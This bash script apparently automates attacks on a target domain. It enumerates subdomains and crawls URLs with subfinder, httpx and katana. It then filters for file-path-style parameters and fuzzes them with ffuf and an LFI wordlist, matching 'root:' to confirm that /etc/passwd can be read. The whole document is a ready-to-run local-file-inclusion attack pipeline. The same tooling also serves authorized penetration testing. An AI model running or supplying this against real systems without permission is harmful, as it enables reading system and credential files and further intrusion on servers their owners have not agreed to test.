
#!/bin/bash
target=$1
mkdir $1
cd $1
subfinder -d $1 -all -recursive > subdomain.txt
httpx -l subdomain.txt -o live.txt 
katana -u live.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
cat allurls.txt |  grep -E 'Image_url=|Open=|callback=|cgi-bin/redirect\.cgi|cgi-bin/redirect\.cgi\?|checkout=|checkout_url=|continue=|data=|dest=|destination=|dir=|domain=|feed=|file=|document=|folder=|root=|path=|pg=|style=|pdf=|template=|php_path=|doc=|page=|name=|cat=|dir=|action=|board=|date=|detail=|download=|prefix=|include=|inc=|locate=|show=|site=|type=|view=|content=|layout=|mod=|conf=|url=|val=|validate=|window=' >lfi.txt
cat lfi.txt |  sed 's/=\(.*\)/=/' | sed  's/=\s*/=FUZZ/g'  >addfuzz.txt
rm -r subdomain.txt
rm -r live.txt

for URL in $(<addfuzz.txt); do ffuf -u "$URL" -w  /home/learn/Desktop/ALL/wordlist/lfi.txt -v -c -mr "root:" 
done
